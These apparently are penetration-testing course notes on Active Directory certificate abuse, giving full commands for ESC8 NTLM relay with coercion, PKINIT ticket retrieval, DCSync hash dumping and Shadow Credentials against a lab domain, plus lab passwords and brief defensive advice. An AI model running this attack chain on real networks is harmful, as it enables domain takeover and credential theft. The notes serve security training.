# Pass the Certificate

## 1. Concept Overview

**Pass the Certificate** abuses **Kerberos PKINIT** (Public Key Cryptography for Initial Authentication) to obtain a **Ticket Granting Ticket (TGT)** using an **X.509 certificate** instead of a password or hash.

Key points:

* Uses **certificates** rather than NTLM hashes or Kerberos keys
* Commonly abused via **Active Directory Certificate Services (AD CS)**
* Leads directly to **Pass the Ticket (PtT)** once a TGT is obtained
* Frequently results in **Domain Admin compromise**

---

## 2. PKINIT in Kerberos (Quick Recap)

* PKINIT allows authentication using:

  * X.509 certificate
  * Associated private key
* Common use cases:

  * Smart cards
  * Machine authentication
* If an attacker controls a valid certificate → they control Kerberos authentication

---

## 3. AD CS NTLM Relay (ESC8)

### 3.1 Attack Overview (ESC8)

ESC8 is an **NTLM relay attack** targeting **AD CS web enrollment** endpoints (HTTP).

Requirements:

* AD CS web enrollment enabled (`/certsrv`)
* NTLM authentication allowed over HTTP
* Attacker can coerce authentication (e.g., Printer Bug)

Result:

* Attacker obtains a **certificate for a victim account**
* Certificate can be used for **PKINIT**

---

### 3.2 Start NTLM Relay to AD CS

```bash
impacket-ntlmrelayx \
  -t http://10.129.234.110/certsrv/certfnsh.asp \
  --adcs \
  --smb2support \
  --template KerberosAuthentication
```

Notes:

* `--template` must allow authentication
* Template name varies per environment
* Can be enumerated with tools like **Certipy**

---

### 3.3 Coerce Authentication (Printer Bug)

```bash
python3 printerbug.py \
  INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.234.109 \
  10.10.16.12
```

Notes:

* Forces target (DC01) to authenticate to attacker
* Requires **Print Spooler** enabled
* Triggers NTLM authentication automatically

---

### 3.4 Result: Certificate Issued

```text
[*] GOT CERTIFICATE!
[*] Writing PKCS#12 certificate to ./DC01$.pfx
```

Notes:

* Certificate issued for **DC01$**
* Stored as `.pfx` (PKCS#12)
* Includes private key → full control

---

## 4. Pass the Certificate (PKINIT)

### 4.1 Prepare PKINIT Tools

```bash
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

Fix common crypto error:

```bash
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

---

### 4.2 Obtain TGT Using Certificate

```bash
python3 gettgtpkinit.py \
  -cert-pfx DC01$.pfx \
  -dc-ip 10.129.234.109 \
  'inlanefreight.local/dc01$' \
  /tmp/dc.ccache
```

Notes:

* Uses certificate for PKINIT
* Outputs **Kerberos TGT**
* Stored in ccache file
* No password or hash required

---

### 4.3 Load TGT into Session

```bash
export KRB5CCNAME=/tmp/dc.ccache
klist
```

Notes:

* Session now authenticated as **DC01$**
* Ready for PtT operations

---

## 5. Domain Compromise via DCSync

```bash
impacket-secretsdump \
  -k -no-pass \
  -dc-ip 10.129.234.109 \
  -just-dc-user Administrator \
  'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

Notes:

* Requires Domain Controller privileges
* Dumps NTLM hashes from NTDS
* Full domain compromise

---

## 6. Shadow Credentials (msDS-KeyCredentialLink)

### 6.1 Attack Overview

Shadow Credentials abuse **msDS-KeyCredentialLink**, which stores PKINIT public keys.

If an attacker has:

* `Write` access to msDS-KeyCredentialLink

They can:

* Add their own certificate
* Authenticate as the victim via PKINIT

---

### 6.2 Add Shadow Credential (pywhisker)

```bash
pywhisker \
  --dc-ip 10.129.234.109 \
  -d INLANEFREIGHT.LOCAL \
  -u wwhite \
  -p 'package5shores_topher1' \
  --target jpinkman \
  --action add
```

Notes:

* Generates certificate + key
* Writes public key to victim account
* Outputs `.pfx` file + password

---

### 6.3 Obtain TGT as Victim

```bash
python3 gettgtpkinit.py \
  -cert-pfx eFUVVTPf.pfx \
  -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
  -dc-ip 10.129.234.109 \
  INLANEFREIGHT.LOCAL/jpinkman \
  /tmp/jpinkman.ccache
```

---

### 6.4 Use the Ticket (PtT)

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

Notes:

* Full impersonation of victim user
* Valid until ticket expiration

---

## 7. Lateral Movement with Certificate-Based TGT

### 7.1 Evil-WinRM via Kerberos

```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

Notes:

* Uses Kerberos authentication
* Requires proper `/etc/krb5.conf`
* No password or hash used

---

## 8. When PKINIT Is Not Supported

### 8.1 PassTheCert (LDAPS Auth)

Notes:

* Used when PKINIT EKU is missing
* Authenticates via **LDAPS**
* Can:

  * Change passwords
  * Grant DCSync
* Advanced AD CS attack (out of scope)

---

## 9. Key Takeaways

* Certificates = **Kerberos identity**
* AD CS misconfigurations are **high impact**
* ESC8 leads directly to **Domain Admin**
* Shadow Credentials persist until removed
* Pass the Certificate → Pass the Ticket → Full compromise

---

## 10. Defensive Notes (Blue Team)

* Disable HTTP enrollment for AD CS
* Require HTTPS + Extended Protection
* Monitor:

  * Certificate issuance
  * msDS-KeyCredentialLink changes
* Restrict template permissions
* Audit NTLM relay paths
